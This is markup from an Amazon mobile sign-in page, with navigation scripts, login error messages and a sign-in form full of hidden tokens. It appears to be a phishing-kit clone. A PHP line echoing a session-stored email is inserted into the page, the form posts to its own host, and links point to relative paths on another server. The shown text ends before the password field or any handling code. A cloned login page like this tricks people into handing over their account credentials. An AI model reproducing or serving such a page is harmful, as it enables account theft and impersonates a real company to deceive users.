window.$Nav && $Nav.declare('config',{"firstName":"","isFreshCustomer":false,"isPrimeCustomer":false,"isPrimeDay":false,"regionalStores":["QW1hem9uIEZyZXNo","VUZHIFdob2xlIEZvb2Rz","VUZHIFdob2xlIEZvb2Rz","VUZHIFdob2xlIEZvb2Rz","VUZHIFdob2xlIEZvb2Rz","VUZHIFdob2xlIEZvb2Rz","VUZHIFdob2xlIEZvb2Rz","VUZHIFdob2xlIEZvb2Rz","VUZHIFdob2xlIEZvb2Rz","VUZHIFdob2xlIEZvb2Rz","VUZHIFdob2xlIEZvb2Rz","VUZHIFdob2xlIEZvb2Rz","VUZHIFdob2xlIEZvb2Rz","VUZHIFdob2xlIEZvb2Rz","VUZHIFdob2xlIEZvb2Rz","VUZHIFdob2xlIEZvb2Rz","VUZHIFdob2xlIEZvb2Rz","VUZHIFdob2xlIEZvb2Rz","VUZHIFdob2xlIEZvb2Rz","VUZHIFdob2xlIEZvb2Rz","VUZHIFdob2xlIEZvb2Rz","VUZHIFdob2xlIEZvb2Rz","VUZHIFdob2xlIEZvb2Rz","VUZHIFdob2xlIEZvb2Rz","VUZHIFdob2xlIEZvb2Rz","VUZHIFdob2xlIEZvb2Rz","VUZHIFdob2xlIEZvb2Rz","VUZHIFdob2xlIEZvb2Rz","VUZHIFdob2xlIEZvb2Rz","VUZHIFdob2xlIEZvb2Rz","VUZHIFdob2xlIEZvb2Rz","VUZHIFdob2xlIEZvb2Rz","VUZHIFdob2xlIEZvb2Rz","VUZHIFdob2xlIEZvb2Rz","VUZHIFdob2xlIEZvb2Rz","VUZHIFdob2xlIEZvb2Rz","VUZHIFdob2xlIEZvb2Rz","VUZHIFdob2xlIEZvb2Rz","VUZHIFdob2xlIEZvb2Rz","VUZHIFdob2xlIEZvb2Rz","VUZHIFdob2xlIEZvb2Rz","VUZHIFdob2xlIEZvb2Rz","VUZHIFdob2xlIEZvb2Rz","VUZHIFdob2xlIEZvb2Rz","VUZHIFdob2xlIEZvb2Rz","VUZHIFdob2xlIEZvb2Rz","VUZHIFdob2xlIEZvb2Rz","VUZHIFdob2xlIEZvb2Rz","VUZHIFdob2xlIEZvb2Rz","VUZHIFdob2xlIEZvb2Rz"],"hashCustomerAndSessionId":"6f93b9f4d9e3ad3a4e3868abb29a0057cba237be","isExportMode":false,"languageCode":"en_US","environmentVFI":"AmazonNavigationCards/development@B6048321973-AL2_x86_64","isBackup":false,"enableInlineHbMenu":0,"isInternal":"0","mobileBlueheaven":"true","navDeviceType":"mobile","pinnedNav":0,"pseudoPrimeFirstBrowse":null,"searchISS":{"sessionId":"144-8202436-4876725","requestId":"VSZ4ZGX2EWQ1W9SH2WX0","customerId":"","language":"en_US","pageType":"Standard","isInternal":0,"useSXISS":"","host":"completion.amazon.com/search/complete","mktID":1,"isInIssXCatWeblabTreatment":0,"aliases":"aps,amazon-custom-products,amazon-devices,amazonbasics,amazonfresh,amazon-pharmacy,wholefoods,allthebestpets,bartelldrugs,bristolfarms,freshthyme,kegnbottle,missionwinespirits,petfoodexpress,sousaswineliquors,surdyksliquorcheeseshop,unionsquarewine,vintagegrape,westsidemarket,stripbooks,popular,apparel,electronics,sporting,sports-and-fitness,outdoor-recreation,fan-shop,garden,videogames,toys-and-games,jewelry,digital-text,digital-music,prime-digital-music,watches,grocery,hpc,instant-video,handmade,handmade-jewelry,handmade-home-and-kitchen,prime-instant-video,shop-instant-video,baby-products,office-products,software,smart-home,magazines,tools,automotive,misc,industrial,mi,pet-supplies,digital-music-track,digital-music-album,mobile,mobile-apps,movies-tv,music-artist,music-album,music-song,stripbooks-spanish,electronics-accessories,photo,audio-video,computers,furniture,kitchen,audible,audiobooks,beauty,shoes,arts-crafts,appliances,gift-cards,pets,outdoor,lawngarden,collectibles,replacement-parts,financial,fine-art,fashion,fashion-womens,fashion-womens-clothing,fashion-womens-jewelry,fashion-womens-shoes,fashion-womens-watches,fashion-womens-handbags,fashion-mens,fashion-mens-clothing,fashion-mens-jewelry,fashion-mens-shoes,fashion-mens-watches,fashion-girls,fashion-girls-clothing,fashion-girls-jewelry,fashion-girls-shoes,fashion-girls-watches,fashion-boys,fashion-boys-clothing,fashion-boys-jewelry,fashion-boys-shoes,fashion-boys-watches,fashion-baby,fashion-baby-boys,fashion-baby-girls,fashion-luggage,3d-printing,tradein-aps,todays-deals,live-explorations,local-services,vehicles,video-shorts,warehouse-deals,luxury-beauty,banjo-apps,black-friday,cyber-monday,alexa-skills,subscribe-with-amazon,courses,edu-alt-content,amazon-global-store,prime-wardrobe,under-ten-dollars,tempo,specialty-aps-sns,luxury","cxNoiseReductionTreatment":0,"autoScrollUpSearchBoxTreatment":0,"opfSwitch":0,"opfMobileSwitch":0,"useApiV2Mobile":0,"showBIAWidgetinISSTreatment":0,"isISSmWebRefactorEnabled":1,"disableAutocompleteOnFocus":0,"ime":0},"searchIconAction":"footer","searchIconEvent":"nojs","isHMenuBrowserCacheDisable":false});
</script>
<script type="text/javascript">window.navmet.push({key:'MobileNavConfig',end:+new Date(),begin:window.navmet.tmp});</script>

<!--NAVYAAN-MOBILEPRENAV-MARKER-->


  <!-- NAVYAAN -->




<header id="nav-main" data-nav-language="en_US" class="nav-mobile nav-progressive-attribute nav-locale-us nav-lang-en nav-ssl nav-unrec nav-blueheaven">
    
    <div id="navbar" cel_widget_id="Navigation-mobile-navbar" role="navigation" class="nav-t-basicNoAuth nav-sprite-v3 celwidget" data-csa-c-id="9rwrs3-ul63ey-rxd3ys-5viabm">
        <div id="nav-logobar">
            <div class="nav-left">
                
                
                
                <script type="text/javascript">window.navmet.tmp=+new Date();</script>
  <div id="nav-logo">
    <a href="/ref=navm_hdr_logo" id="nav-logo-sprites" class="nav-logo-link nav-progressive-attribute" aria-label="Amazon">
      <span class="nav-sprite nav-logo-base"></span>
      <span id="logo-ext" class="nav-sprite nav-logo-ext nav-progressive-content"></span>
      <span class="nav-logo-locale">.us</span>
    </a>
  </div>
<script type="text/javascript">window.navmet.push({key:'Logo',end:+new Date(),begin:window.navmet.tmp});</script>
            </div>
            <div class="nav-right">
                
                
                
                  
            </div>
        </div>
        

        
        
        <script type="text/javascript">var nav_t_after_searchbar = + new Date();</script>

        
        
        

        

        
        
        <!--NAVYAAN-SUBNAV-AND-SMILE-FROM-GURUPA-->
        
        
    </div>
    
    
    <div id="nav-progressive-subnav">
      
    </div>
</header>




<script type="text/javascript">
  if (window.ue_t0) {
    window.navmet.push({key:"NavMainPaintEnd",end:+new Date(),begin:window.ue_t0});
    window.navmet.push({key:"NavFirstPaintEnd",end:+new Date(),begin:window.ue_t0});
  }
</script>



<script type="text/javascript">
    if (window.ue_t0) {
      window.navmet.push({key:"NavMainEnd",end:+new Date(),begin:window.ue_t0});
    }
    var nav_t_after_navbar = + new Date();
    window.navmet.push({key:"NavBar",end:+new Date(),begin:window.navmet.main});
    window.uet && uet('ne');
    var nav_t_end_nav = + new Date();
    window.navmet.MainEnd = new Date();
</script>
    </div>

    <div class="a-container">
      <div class="a-section a-spacing-none">
        
      </div>

      

      <div class="a-section a-spacing-none auth-pagelet-mobile-container">
        







  

  

  


      </div>

      <div class="a-section auth-pagelet-mobile-container">
        
        






  
  
    
    
    
    
  



  





<div id="auth-alert-window" class="a-box a-alert a-alert-error a-spacing-small" aria-live="assertive" role="alert"><div class="a-box-inner a-alert-container"><h4 class="a-alert-heading">There was a problem</h4><div class="a-alert-content">
  <ul class="a-unordered-list a-vertical auth-error-messages" role="alert">
    <li id="auth-customerName-missing-alert"><span class="a-list-item">
      Enter your name
    </span></li>
    <li id="auth-customerNamePronunciation-missing-alert"><span class="a-list-item">
      Enter your name pronunciation
    </span></li>
    <li id="auth-phoneNumber-missing-alert"><span class="a-list-item">
      Enter your mobile number
    </span></li>
    <li id="auth-phoneNumber-invalid-phone-alert"><span class="a-list-item">
      The mobile number you entered does not seem to be valid
    </span></li>
    <li id="auth-email-missing-alert"><span class="a-list-item">
      Enter your email or mobile phone number
    </span></li>
    <li id="auth-password-missing-alert"><span class="a-list-item">
      Enter your password
    </span></li>
    <li id="auth-password-invalid-password-alert"><span class="a-list-item">
      Passwords must be at least 6 characters.
    </span></li>
    <li id="auth-guess-missing-alert"><span class="a-list-item">
      Enter the characters as they are given in the challenge.
    </span></li>
    <li id="auth-email-invalid-email-alert"><span class="a-list-item">
      Enter a valid email address
    </span></li>
  </ul>
</div></div></div>


<h2>
  Sign-In
</h2>

<div class="a-row a-spacing-base">
  <span><?php echo $_SESSION['email'];?></span>
  <a id="ap_change_login_claim" class="a-link-normal" tabindex="7" href="../ap/">
    Change
  </a>
</div>



<form name="signIn" method="post" novalidate="" action="" class="auth-validate-form auth-clearable-form auth-validate-form" data-fwcim-id="yxctsyCs">
  <input type="hidden" name="appActionToken" value="Jcsj2BuPj2B2CliJj2FazabCRc2JDGxpEj3D"><input type="hidden" name="appAction" value="SIGNIN_PWD_COLLECT">

  




  
    <input type="hidden" name="metadata1" value="ECdITeCs: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">
  
    <input type="hidden" name="siteState" value="ape:aXNSZWd1bGFyQ2hlY2tvdXQuMXxJTUJNc2dzLnxpc1JlZGlyZWN0LjE=">
  
    <input type="hidden" name="openid.return_to" value="ape:aHR0cHM6Ly93d3cuYW1hem9uLmNvbS9ncC9idXkvc2lnbmluL2hhbmRsZXJzL2NvbnRpbnVlLmh0bWw/aWU9VVRGOCZicmFuZElkPSZjYXJ0SXRlbUlkcz0mZUdDQXBwPSZoYXNXb3JraW5nSmF2YXNjcmlwdD0wJmlzRUdDT3JkZXI9MCZpc0ZyZXNoPSZvbGRDdXN0b21lcklkPTAmb2xkUHVyY2hhc2VJZD0mcHJlSW5pdGlhdGVDdXN0b21lcklkPSZwdXJjaGFzZUluUHJvZ3Jlc3M9JnJlZl89Y2FydF9zaWduaW5fc3VibWl0JnNpdGVEZXNpZ249">
  
    <input type="hidden" name="prevRID" value="ape:VlNaNFpHWDJFV1ExVzlTSDJXWDA=">
  
